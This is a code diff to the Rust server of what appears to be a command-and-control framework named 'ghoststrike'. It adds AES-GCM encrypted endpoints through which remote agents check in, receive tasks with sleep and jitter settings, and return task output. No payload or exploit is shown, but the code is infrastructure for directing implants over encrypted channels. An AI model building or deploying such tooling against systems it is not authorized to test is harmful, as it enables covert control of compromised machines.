@@ -14,7 +14,10 @@ use futures::{SinkExt, StreamExt};
 use tracing::{info, warn};
 use uuid::Uuid;
 
-use ghoststrike_common::{AgentCheckinReq, AgentCheckinResp, OperatorMsg, TaskResultReq};
+use ghoststrike_common::{
+    decrypt, encrypt, AgentCheckinReq, AgentCheckinResp, EncryptedEnvelope,
+    OperatorMsg, SessionKey, TaskResultReq,
+};
 
 use crate::{
     config::ServerConfig,
@@ -26,9 +29,12 @@ pub async fn serve(state: SharedState, cfg: &ServerConfig) -> anyhow::Result<()>
     let app = Router::new()
         // Operator WebSocket
         .route("/ws", get(operator_ws_handler))
-        // Agent HTTP API
-        .route("/api/checkin",    post(agent_checkin))
-        .route("/api/taskresult", post(agent_task_result))
+        // Agent HTTP API — plaintext
+        .route("/api/checkin",        post(agent_checkin))
+        .route("/api/taskresult",     post(agent_task_result))
+        // Agent HTTP API — AES-GCM encrypted
+        .route("/api/checkin/enc",    post(agent_checkin_enc))
+        .route("/api/taskresult/enc", post(agent_task_result_enc))
         .with_state(state.clone());
 
     let addr: SocketAddr = format!("{}:{}", cfg.bind_host, cfg.operator_port).parse()?;
@@ -190,6 +196,86 @@ async fn agent_task_result(
     State(state): State<SharedState>,
     Json(req): Json<TaskResultReq>,
 ) -> Json<serde_json::Value> {
+    state
+        .update_task_result(req.agent_id, req.task_id, req.output, req.success)
+        .await;
+    Json(serde_json::json!({ "ok": true }))
+}
+
+// ── Encrypted routes ──────────────────────────────────────────────────────────
+
+fn server_session_key(state: &SharedState) -> Option<SessionKey> {
+    let hex = &state.config.c2_key;
+    if hex.is_empty() { return None; }
+    let raw = hex::decode(hex).ok()?;
+    SessionKey::from_bytes(&raw).ok()
+}
+
+async fn agent_checkin_enc(
+    State(state): State<SharedState>,
+    Json(env): Json<EncryptedEnvelope>,
+) -> Json<serde_json::Value> {
+    let key = match server_session_key(&state) {
+        Some(k) => k,
+        None    => return Json(serde_json::json!({ "error": "encryption not configured" })),
+    };
+    let mut data = env.nonce.clone();
+    data.extend_from_slice(&env.ciphertext);
+    let plain = match decrypt(&key, &data) {
+        Ok(p) => p,
+        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
+    };
+    let req: AgentCheckinReq = match serde_json::from_slice(&plain) {
+        Ok(r) => r,
+        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
+    };
+
+    state.upsert_agent(req.info).await;
+    let tasks = state.pending_tasks_for(req.agent_id).await;
+    let (sleep_ms, jitter_pct) = {
+        let agents = state.agents.read().await;
+        agents
+            .get(&req.agent_id)
+            .map(|a| (a.sleep_ms, a.jitter_pct))
+            .unwrap_or((5000, 10))
+    };
+    let resp = AgentCheckinResp { tasks, sleep_ms, jitter_pct };
+
+    let resp_bytes = match serde_json::to_vec(&resp) {
+        Ok(b) => b,
+        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
+    };
+    let ct = match encrypt(&key, &resp_bytes) {
+        Ok(c) => c,
+        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
+    };
+    let (nonce, ciphertext) = ct.split_at(12);
+    let resp_env = EncryptedEnvelope {
+        agent_id:   req.agent_id,
+        nonce:      nonce.to_vec(),
+        ciphertext: ciphertext.to_vec(),
+    };
+    Json(serde_json::to_value(&resp_env).unwrap_or_default())
+}
+
+async fn agent_task_result_enc(
+    State(state): State<SharedState>,
+    Json(env): Json<EncryptedEnvelope>,
+) -> Json<serde_json::Value> {
+    let key = match server_session_key(&state) {
+        Some(k) => k,
+        None    => return Json(serde_json::json!({ "error": "encryption not configured" })),
+    };
+    let mut data = env.nonce.clone();
+    data.extend_from_slice(&env.ciphertext);
+    let plain = match decrypt(&key, &data) {
+        Ok(p) => p,
+        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
+    };
+    let req: TaskResultReq = match serde_json::from_slice(&plain) {
+        Ok(r) => r,
+        Err(e) => return Json(serde_json::json!({ "error": e.to_string() })),
+    };
     state
         .update_task_result(req.agent_id, req.task_id, req.output, req.success)
         .await;
